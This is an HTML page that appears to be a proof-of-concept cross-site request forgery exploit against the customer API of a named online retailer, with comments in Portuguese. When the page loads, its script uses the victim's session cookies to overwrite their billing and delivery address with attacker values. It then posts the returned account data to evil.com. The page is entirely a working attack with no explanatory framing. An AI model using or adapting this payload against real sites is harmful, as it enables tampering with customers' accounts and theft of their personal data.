<!DOCTYPE html>
<html>
<body>
    <script>
        fetch("https://www.boozt.com/de/de/api/customer", {
            method: "PATCH",
            credentials: "include", // Envia o PHPSESSID da vÃ­tima
            headers: {
                "Content-Type": "application/json",
                "X-Requested-With": "XMLHttpRequest"
            },
            body: JSON.stringify({
                "requisites": {
                    "billing_firstname": "Hacked",
                    "billing_lastname": "ByMe",
                    "billing_street": "EvilStreet",
                    "billing_postcode": "666",
                    "billing_city": "Hell",
                    "billing_country": "pt",
                    "delivery_firstname": "Hacked",
                    "delivery_lastname": "ByMe",
                    "delivery_street": "EvilStreet",
                    "delivery_postcode": "666",
                    "delivery_city": "Hell",
                    "delivery_country": "pt",
                    "delivery_as_billing": true
                }
            })
        })
        .then(response => response.json())
        .then(data => {
            // Redireciona o resultado para o atacante
            fetch("http://evil.com/capture", {
                method: "POST",
                body: JSON.stringify(data)
            });
        })
        .catch(error => console.error("Erro:", error));
    </script>
</body>
</html>
